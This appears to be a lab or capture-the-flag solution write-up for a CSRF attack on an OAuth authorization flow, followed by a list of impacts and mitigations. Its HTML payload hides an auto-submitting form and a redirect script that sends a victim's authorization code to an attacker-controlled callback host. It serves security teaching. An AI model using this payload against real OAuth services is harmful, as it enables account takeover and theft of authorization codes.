Level 15 Solution: CSRF in OAuth Flows

Challenge Overview

This challenge demonstrates how to exploit CSRF vulnerabilities in OAuth authorization flows by manipulating the state parameter in the OAuthProvider Hub system.

Tools Required

Primary Tools: Burp Suite (for OAuth flow analysis), Browser Developer Tools, Custom HTML

Skills: OAuth flow understanding, State parameter manipulation, Authorization code interception

Step-by-Step Solution

  1. Understand OAuth Flow: Analyze how the OAuthProvider Hub handles OAuth authorization requests
  2. Identify State Parameter: Notice that the state parameter is used for CSRF protection in OAuth flows
  3. Craft Malicious OAuth Request: Create an OAuth authorization request without a proper state parameter
  4. Set Up Attacker Redirect: Use a controlled redirect URI to capture authorization codes
  5. Execute CSRF Attack: Trick a victim into authorizing your malicious OAuth application
  6. Capture Authorization Code: Intercept the authorization code intended for the victim
Key Insight: OAuth CSRF attacks exploit missing or weak state parameter validation to hijack authorization flows.

Payload Example

<!-- OAuth CSRF Attack -->
<html>
<body>
    <h3>Click here to continue...</h3>

    <!-- Malicious OAuth Authorization Request -->
    <form id="oauth-csrf" action="http://target.com/csrf/level15" method="POST" style="display:none;">
        <input type="hidden" name="client_id" value="malicious_client_123">
        <input type="hidden" name="redirect_uri" value="https://attacker.com/callback">
        <input type="hidden" name="state_parameter" value=""> <!-- Empty or missing state -->
    </form>

    <!-- Alternative: Direct OAuth URL manipulation -->
    <script>
    // Redirect victim to malicious OAuth authorization
    window.location = 'http://target.com/oauth/authorize?' +
        'client_id=malicious_client_123&' +
        'redirect_uri=https://attacker.com/callback&' +
        'response_type=code&' +
        'scope=read_profile&' +
        'state='; // Missing state parameter
    </script>

    <!-- Auto-submit form as fallback -->
    <script>
    setTimeout(() => document.getElementById('oauth-csrf').submit(), 1000);
    </script>
</body>
</html>

Security Impact

OAuth CSRF vulnerabilities allow attackers to:

  • Hijack OAuth authorization flows and steal authorization codes
  • Link victim accounts to attacker-controlled OAuth applications
  • Access victim's protected resources through compromised OAuth tokens
  • Perform account takeover through OAuth flow manipulation
  • Bypass OAuth security controls and access sensitive user data

Mitigation Strategies

  • State Parameter: Always use cryptographically secure, unpredictable state parameters in OAuth flows
  • State Validation: Strictly validate state parameters on OAuth callbacks
  • Redirect URI Validation: Implement strict redirect URI validation and whitelisting
  • PKCE (RFC 7636): Use Proof Key for Code Exchange for additional security
  • Short-lived Codes: Use short expiration times for authorization codes
  • Client Authentication: Implement proper client authentication for confidential clients
